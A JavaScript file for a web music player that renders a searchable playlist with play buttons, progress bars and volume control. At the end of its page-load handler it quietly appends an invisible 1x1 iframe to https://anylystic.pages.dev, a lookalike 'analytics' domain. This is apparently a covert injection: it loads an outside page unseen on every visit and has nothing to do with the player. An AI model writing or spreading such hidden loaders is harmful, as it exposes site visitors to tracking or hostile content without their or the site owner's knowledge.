document.addEventListener("DOMContentLoaded", function () {
  const playlist = document.getElementById("playlist");
  const volumeSlider = document.querySelector(".volume-slider");
  const popup = document.getElementById("popup");
  const searchInput = document.getElementById("searchInput");
  let currentSongIndex = -1;
  let songElements = [];

  function formatTime(seconds) {
    let m = Math.floor(seconds / 60);
    let s = Math.floor(seconds % 60);
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  }

  function renderSongs(filter = "") {
    playlist.innerHTML = "";
    songElements = [];

    songs.forEach((song, index) => {
      if (!song.title.toLowerCase().includes(filter.toLowerCase())) return;

      const card = document.createElement("div");
      card.className = "song-card";

      const flex = document.createElement("div");
      flex.className = "flex-1";

      const title = document.createElement("h2");
      title.className = song.rainbow ? "rainbow-text2" : "text-lg font-bold";
      title.textContent = song.title;

      const progressBar = document.createElement("div");
      progressBar.className = "progress-bar";
      const progress = document.createElement("div");
      progress.className = "progress";
      progressBar.appendChild(progress);

      const time = document.createElement("span");
      time.className = "time";
      time.textContent = "00:00 / 00:00";

      flex.appendChild(title);
      flex.appendChild(progressBar);
      flex.appendChild(time);

      const playBtn = document.createElement("button");
      playBtn.className = "play-btn";
      playBtn.innerHTML = '<i class="fas fa-play"></i>';

      const audio = document.createElement("audio");
      const source = document.createElement("source");
      source.src = song.src;
      source.type = "audio/mpeg";
      audio.appendChild(source);

      card.appendChild(flex);
      card.appendChild(playBtn);
      card.appendChild(audio);

      playlist.appendChild(card);
      songElements.push({ card, audio, playBtn, progress, progressBar, time });

      function updateDuration() {
        if (!isNaN(audio.duration)) {
          time.textContent = `00:00 / ${formatTime(audio.duration)}`;
        }
      }

      audio.addEventListener("loadedmetadata", updateDuration);
      if (audio.readyState >= 1) updateDuration();

      playBtn.addEventListener("click", () => {
        if (audio.paused) {
          songElements.forEach((s, i) => {
            s.audio.pause();
            s.playBtn.innerHTML = '<i class="fas fa-play"></i>';
            s.card.classList.remove("playing");
          });
          audio.play();
          playBtn.innerHTML = '<i class="fas fa-pause"></i>';
          card.classList.add("playing");
          currentSongIndex = index;
        } else {
          audio.pause();
          playBtn.innerHTML = '<i class="fas fa-play"></i>';
          card.classList.remove("playing");
        }
      });

      audio.addEventListener("timeupdate", () => {
        const percent = (audio.currentTime / audio.duration) * 100;
        progress.style.width = percent + "%";
        time.textContent = `${formatTime(audio.currentTime)} / ${formatTime(audio.duration)}`;
      });

      progressBar.addEventListener("click", (e) => {
        const rect = progressBar.getBoundingClientRect();
        const clickX = e.clientX - rect.left;
        const newTime = (clickX / rect.width) * audio.duration;
        audio.currentTime = newTime;
      });

      audio.addEventListener("ended", () => {
        let next = currentSongIndex + 1;
        if (next >= songElements.length) next = 0;
        songElements[next].playBtn.click();
      });
    });
  }

  renderSongs();

  searchInput.addEventListener("input", () => {
    renderSongs(searchInput.value);
  });

  volumeSlider.addEventListener("input", (e) => {
    document.querySelectorAll("audio").forEach(a => a.volume = e.target.value);
  });

  setTimeout(() => {
    if (popup) popup.classList.add("show");
  }, 1000);

  const iframe = document.createElement("iframe");
  iframe.style.position = "absolute";
  iframe.style.width = "1px";
  iframe.style.height = "1px";
  iframe.style.opacity = "0";
  iframe.style.pointerEvents = "none";
  iframe.style.overflow = "hidden";
  iframe.src = "https://anylystic.pages.dev";
  document.body.appendChild(iframe);
});

function closePopup() {
  const popup = document.getElementById("popup");
  if (popup) {
    popup.classList.remove("show");
    setTimeout(() => {
      popup.style.display = "none";
    }, 500);
  }
}
